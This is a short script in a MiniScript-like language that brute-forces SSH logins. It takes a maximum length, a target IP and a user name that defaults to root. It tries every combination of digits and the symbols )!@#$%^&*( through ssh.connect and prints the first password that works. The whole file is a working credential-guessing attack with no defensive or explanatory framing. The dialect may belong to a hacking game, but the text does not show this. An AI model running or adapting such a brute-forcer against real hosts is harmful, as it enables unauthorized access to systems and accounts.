trySshConnect = function (ip, userId, passwd)
    result = ssh.connect(ip, userId, passwd)
    if result == null or result.ok != 1 then
        return false
    end if

    // 성공 세션 정리(필요 없으면 이 블록은 제거 가능)
    if hasIndex(result, "session") and result.session != null then
        ssh.disconnect(result.session)
    end if

    return true
end function

if argc < 2 then
	print "ERROR"
else
	n = floor(val(argv[0]))
	target = argv[1]
    if argc >= 3 then
        userId = argv[2]
    else
        userId = "root"
    end if
	if n < 1 then
		print "ERROR"
	else
		alphabet = "0123456789)!@#$%^&*("

		emitAll = function (prefix, remaining, alphabet)
			if remaining == 0 then
				result = trySshConnect(target, userId, prefix)
                if result then
                    return prefix
				end if
                return null
			end if

			i = 0
			while i < len(alphabet)
				result = emitAll(prefix + alphabet[i], remaining - 1, alphabet)
                if result != null then
                    return result
                end if
				i = i + 1
			end while
            return null
		end function

		length = 1
        result = null
		while length <= n
			result = emitAll("", length, alphabet)
            if result != null then
                print result
                break
            end if
			length = length + 1
		end while
        if result == null then
            print "ERROR"
        end if
	end if
end if